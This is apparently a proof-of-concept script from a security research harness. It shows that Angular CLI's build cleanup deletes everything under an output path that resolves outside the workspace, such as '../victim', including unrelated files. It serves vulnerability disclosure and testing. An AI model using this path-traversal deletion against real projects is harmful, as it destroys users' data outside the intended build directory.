// Application builder delete path (index.ts:176-178): deleteOutputDir(workspaceRoot, base, [browser, server])
// base = normalizeDirectoryPath(path.resolve(workspaceRoot, outputPath)) — NO containment (options.ts:331)
import { deleteOutputDir } from '/Users/matheusvsky/Documents/trab/llm-redteam-harness/upstream/angular-cli/dist/bin/packages/angular/build/src/utils/delete-output-dir.js';
import { readdirSync, mkdirSync } from 'node:fs';
mkdirSync('/tmp/del-poc/victim', { recursive: true });
mkdirSync('/tmp/del-poc/victim/browser', { recursive: true });
mkdirSync('/tmp/del-poc/victim/server', { recursive: true });
mkdirSync('/tmp/del-poc/victim/unrelated', { recursive: true });
import { writeFileSync } from 'node:fs';
['a.txt','b.txt'].forEach(f => writeFileSync('/tmp/del-poc/victim/'+f, 'x'));
writeFileSync('/tmp/del-poc/victim/unrelated/keep.txt','x');
const workspaceRoot = '/tmp/del-poc/ws';
const outputPath = '../victim'; // angular.json outputPath (string form)
import { resolve } from 'node:path';
const base = resolve(workspaceRoot, outputPath); // exactly what options.ts:331 computes
console.log('base resolves to:', base);
console.log('victim BEFORE:', readdirSync('/tmp/del-poc/victim').join(','));
await deleteOutputDir(workspaceRoot, base, ['browser', 'server']); // index.ts:176-178 call shape
console.log('victim AFTER :', readdirSync('/tmp/del-poc/victim').join(',') || '(EMPTY — unrelated dir also removed)');
